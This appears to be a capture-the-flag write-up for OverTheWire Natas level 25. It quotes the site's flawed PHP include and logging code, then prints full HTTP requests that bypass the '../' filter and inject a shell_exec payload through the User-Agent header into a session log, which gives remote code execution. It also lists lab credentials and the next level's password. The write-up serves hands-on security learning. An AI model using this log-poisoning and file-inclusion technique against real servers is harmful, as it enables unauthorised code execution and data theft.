In this level we interact with the page using the `lang` request parameter. If absent or set to `en` we get a text in English language, if set to `de` we get a text in German language.

The PHP code has 3 interesting functions:
```
    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

Essentially when a request is received `setLanguage()` is called. It calls `safeinclude()` which checks the attacker controlled value for directory traversal characters or the string `natas_webpass`. If all checks out it includes the file with path `$filename` in its response.

We can bypass the directory traversal restriction by doubling characters, i.e. use `....//` instead of `../`. When `safeinclude()` sanitizes the string it removes the central characters `../` and we end up with, you guessed it, `../`.

Bypassing the `natas_webpass` is trickier. That's where we leverage bugs in the `logRequest()` function. The function constructs a string and writes it to the session log file. When doing so the User-Agent is appended without sanitization. We can craft a request that will cause `logRequest()` to be called, and then put PHP code in the User-Agent header:
```
GET /?lang=../failme HTTP/1.1
Host: natas25.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNTpPOVFEOURaQkRxMVlwc3dpVE01b3FNRGFPdHVadEFjeA==
Upgrade-Insecure-Requests: 1
User-Agent: <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas25.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=g98u1r5rj0848mpa2d8j1v40ef
Connection: close
```

Then we can use the directory traversal bypass to include the log file path in the `lang` request parameter, then `safeinclude()` will include the log file and execute the PHP code:
```
GET /?lang=....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_g98u1r5rj0848mpa2d8j1v40ef.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNTpPOVFEOURaQkRxMVlwc3dpVE01b3FNRGFPdHVadEFjeA==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas25.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=g98u1r5rj0848mpa2d8j1v40ef
Connection: close
```

Password for next level is `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`.
